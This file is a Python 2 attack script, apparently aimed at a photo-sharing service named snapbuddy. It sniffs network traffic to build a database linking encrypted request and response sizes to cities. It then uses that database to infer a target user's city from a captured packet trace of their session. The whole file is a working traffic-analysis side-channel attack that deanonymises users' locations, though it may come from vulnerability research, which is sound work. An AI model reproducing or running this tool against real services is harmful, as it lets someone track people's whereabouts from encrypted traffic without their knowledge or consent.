import argparse
import json
import sys
import findcities
import location
import packetcollector
import processpackets
import time

# work around for this issue:
# http://stackoverflow.com/questions/5530708/can-i-redirect-unicode-output-from-the-console-directly-into-a-file
import codecs
sys.stdout=codecs.getwriter('utf-8')(sys.stdout)

# the amount to subtract from keys in the database
ZERO_SSID_LENGTH_PY_REQUESTS = 576
ZERO_SSID_LENGTH_FIREFOX = 896
# amount to adjust firefox sizes by
FIREFOX_ADJUSTMENT = -1 * (ZERO_SSID_LENGTH_FIREFOX - ZERO_SSID_LENGTH_PY_REQUESTS)

class LocationAttackDb(object):
    def __init__(self, hostname, port):
        self.hostname = hostname
        self.port = port
        # maps request size to city name
        self.request_size_map = {}

    def build(self, username, password, interface):
        city_finder = findcities.FindCities(self.hostname, self.port, username, password)
        for city, access_points in findcities.all_cities_from_server(self.hostname, self.port):
            with packetcollector.PacketCollector(interface, "tcp port {}".format(self.port)) as packet_collector:
                print city_finder.find_one_city(access_points),
                # give it time for the packets to be collected
                time.sleep(1)
                packet_collector.stop()
                pcap = packet_collector.get_pcap()
                request_size, response_size = location.location_from_pcap(pcap, self.hostname, self.port)
                print "\tsize: ", request_size
                request_size = str(request_size)
                if self.request_size_map.has_key(request_size):
                    print "\t\t COLLISION!"
                    self.request_size_map[request_size].append((city, response_size))
                else:
                    self.request_size_map[request_size] = [(city, response_size)]

    def save(self, db_filename):
        '''
        Saves the database to the file
        '''
        with open(db_filename, 'w') as writer:
            json.dump(self.request_size_map, writer)

    def load(self, db_filename):
        with open(db_filename, 'r') as reader:
            tempDict = json.load(reader)
            # in this map, the keys will all be strings
            # but really they should be integers
            actualDict = {}
            for key, value in tempDict.items():
                actualDict[int(key)] = value
            self.request_size_map = actualDict

    def find_city_from_pcap(self, pcap, adjustment=0):
        request_size, response_size = location.location_from_pcap(pcap, self.hostname, self.port)
        request_size = request_size + adjustment
        print request_size, response_size
        potentialCities = []
        if self.request_size_map.has_key(request_size):
            candidates = self.request_size_map[request_size]
            for (city, respSize) in candidates:
                if respSize == response_size:
                    potentialCities.append(city)
        return potentialCities

    def find_collisions(self):
        # detect a collision by looking for for than one city with the same post and response size

        # maps "{post size}_{response size}" to a list of cities with that post and respnose size
        post_response_dict = {}

        # list of collision keys
        collision_keys = []

        for post_size, candidates in self.request_size_map.items():
            for (city, resp_size) in candidates:
                key = "{}_{}".format(post_size, resp_size)
                if post_response_dict.has_key(key):
                    post_response_dict[key].append(city)
                    collision_keys.append(key)
                else:
                    post_response_dict[key] = [city]

        # list of list of cities that collide with the same value
        collisions = []
        for collision_key in collision_keys:
            collisions.append(post_response_dict[collision_key])
        return collisions


def build(hostname, port, username, password, interface, db_output):
    attack_db = LocationAttackDb(hostname, port)
    attack_db.build(username, password, interface)
    attack_db.save(db_output)

def find(hostname, port, dbname, target_pcap, use_adjustment):
    attack_db = LocationAttackDb(hostname, port)
    attack_db.load(dbname)

    adjustment = 0
    if use_adjustment:
        adjustment = FIREFOX_ADJUSTMENT

    print "Target is in: "
    cities = attack_db.find_city_from_pcap(processpackets.read_pcap(target_pcap), adjustment=adjustment)
    if len(cities) == 0:
        print "could not find location"
        return
    print " or ".join(cities)

def collisions(hostname, port, dbname):
    attack_db = LocationAttackDb(hostname, port)
    attack_db.load(dbname)
    collisions = attack_db.find_collisions()
    for collision in collisions:
        print "Collisions in:"
        for city in collision:
            print "\t", city
    print len(collisions), " collisions total."

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("serverip", help="the server ip address")
    parser.add_argument("serverport", type=int, help="the server port")
    subparsers = parser.add_subparsers(dest="command")
    buildparser = subparsers.add_parser('build', help='Build a new database')
    buildparser.add_argument("username", help="a username to use to login to snapbuddy")
    buildparser.add_argument("password", help="the password for the username")
    buildparser.add_argument("interface", help="the interface to use when building the database (required when building)")
    buildparser.add_argument("outfile", help="specify the filename for the database to build")

    findparser = subparsers.add_parser('find', help="Find a user from a pcap")
    findparser.add_argument('dbname', help='filename of a prebuilt database to consult')
    findparser.add_argument('pcap', help='pcap file of observed session')
    findparser.add_argument('--useffadjustment', default=False, action="store_true", help="adjust values to account for FireFox")

    collisionparser = subparsers.add_parser('collisions')
    collisionparser.add_argument('dbname', help='filename of a prebuilt database to consult')

    args = parser.parse_args()
    if args.command == 'build':
        build(args.serverip, args.serverport, args.username, args.password, args.interface, args.outfile)
    elif args.command == 'find':
        find(args.serverip, args.serverport, args.dbname, args.pcap, args.useffadjustment)
    elif args.command == 'collisions':
        collisions(args.serverip, args.serverport, args.dbname)

if __name__ == "__main__":
    main()
